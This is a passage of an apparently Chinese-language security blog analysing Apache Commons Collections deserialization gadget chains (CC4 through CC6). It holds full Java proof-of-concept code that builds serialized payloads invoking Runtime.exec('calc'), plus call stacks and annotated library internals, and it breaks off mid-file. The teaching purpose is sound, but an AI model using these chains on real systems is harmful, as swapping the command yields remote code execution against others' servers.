class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TransformingComparator å®ä¾‹</span></span><br><span class="line">            <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//PriorityQueue å®ä¾‹</span></span><br><span class="line">            <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//å…ˆè®¾ç½®ä¸ºæ­£å¸¸å˜é‡å€¼ï¼Œåé¢å¯ä»¥é€šè¿‡setFieldValueä¿®æ”¹</span></span><br><span class="line">            priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">            priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">            Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, objects);</span><br><span class="line">            setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æµ‹è¯•ååºåˆ—åŒ–</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¤§ä½“è°ƒç”¨æ ˆï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                 -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;ChainedTransformer.transform()</span><br><span class="line">                        -&gt;ConstantTransformer.transform()</span><br><span class="line">                                    -&gt;InstantiateTransformer.transform()</span><br><span class="line">                             -&gt;TrAXFilter.TrAXFilter()</span><br><span class="line">                                 -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                                        -&gt;â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure></div><h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><p><strong>æµ‹è¯•ç¯å¢ƒ</strong>ï¼š3.1-3.2.1ï¼Œjdk1.8</p><p>è¿™é‡Œæˆ‘ä»¬åˆå›åˆ°äº†å»è§¦å‘ LazyMap.get()ï¼Œåªä¸è¿‡æˆ‘ä»¬æ”¹å˜äº† LazyMap.get() çš„è§¦å‘æ–¹å¼ï¼Œä¸å†å’Œ CC1 å’Œ CC3 ä¸€æ ·å€ŸåŠ© AnnotationInvocationHandler çš„ååºåˆ—åŒ–è§¦å‘ã€‚</p><p>è¿™é‡Œå¼•å…¥æ–°ç±» TiedMapEntryï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Entry</span>, KeyValue, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°ï¼Œæ˜¾ç„¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶ this.map ä¸º LazyMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//toStringå‡½æ•°ï¼Œæ³¨æ„è¿™é‡Œè°ƒç”¨äº† getValue()</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·Ÿè¿› getValue(), è¿™æ˜¯å…³é”®ç‚¹ this.map.get() è§¦å‘ LazyMap.get()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç»¼ä¸Šï¼Œé€šè¿‡ TiedMapEntry.toString() å¯è§¦å‘ LazyMap.get()</p><p>BadAttributeValueExpExceptionå¯ä»¥åœ¨ååºåˆ—åŒ–æ—¶è§¦å‘ TiedMapEntry.toString()</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>   &#123;</span><br><span class="line">    <span class="keyword">private</span> Object val;     <span class="comment">//è¿™é‡Œå¯ä»¥æ§åˆ¶ val ä¸º TiedMapEntry</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();    <span class="comment">//è¿™é‡Œæ˜¯å…³é”®ç‚¹ï¼Œè°ƒç”¨toString()</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å®Œæ•´ä»£ç </p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMapå®ä¾‹</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TiedMapEntry å®ä¾‹</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//BadAttributeValueExpException å®ä¾‹</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„è®¾ç½® val</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æµ‹è¯•ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¤§ä½“è°ƒç”¨æ ˆï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;BadAttributeValueExpException.readObject()</span><br><span class="line">      -&gt;TiedMapEntry.toString()</span><br><span class="line">          -&gt;TiedMapEntry.getValue()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                    -&gt;ConstantTransformer.transform()</span><br><span class="line">                            -&gt;InvokerTransformer.transform()</span><br><span class="line">                                -&gt;â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure></div><h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><p><strong>æµ‹è¯•ç¯å¢ƒ</strong>ï¼š3.1-3.2.1ï¼Œjdk1.7,1.8</p><p>ç”¨HashMapè§¦å‘LazyMap.get()</p><p>å†ç ”ç©¶ç ”ç©¶ TiedMapEntry è¿™ä¸ªç±»</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Entry</span>, KeyValue, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°ï¼Œæ˜¾ç„¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶ this.map ä¸º LazyMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hashCodeå‡½æ•°ï¼Œæ³¨æ„è¿™é‡Œè°ƒç”¨äº† getValue()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·Ÿè¿› getValue(), è¿™æ˜¯å…³é”®ç‚¹ this.map.get() è§¦å‘ LazyMap.get()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ååºåˆ—åŒ–æ—¶è§¦å‘ TiedMapEntry.hashCode()éœ€è¦ç”¨åˆ°HashMap</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¿™é‡Œæ˜¯ jdk 1.7 çš„ï¼Œä¸åŒç‰ˆæœ¬ HashMap readObject å¯èƒ½ç•¥æœ‰ä¸åŒ</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…ˆçœ‹çœ‹å…¶ readObject</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        â€¦â€¦â€¦â€¦</span><br><span class="line">         <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putForCreate(key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//è·Ÿè¿› putForCreate æ–¹æ³•</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key); <span class="comment">//å…³é”®ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ key ä¸ºTiedMapEntryï¼Œç„¶åè®¡ç®—hash(TiedMapEntry)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line"></span><br><span class="line">         â€¦â€¦â€¦â€¦</span><br><span class="line"></span><br><span class="line">        createEntry(hash, key, value, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·Ÿè¿› hash æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h ^= k.hashCode();  <span class="comment">//å…³é”®ç‚¹ï¼Œè§¦å‘ TiedMapEntry.hashCode()</span></span><br><span class="line">        â€¦â€¦â€¦â€¦</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>æœ€ç»ˆä»£ç </p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span 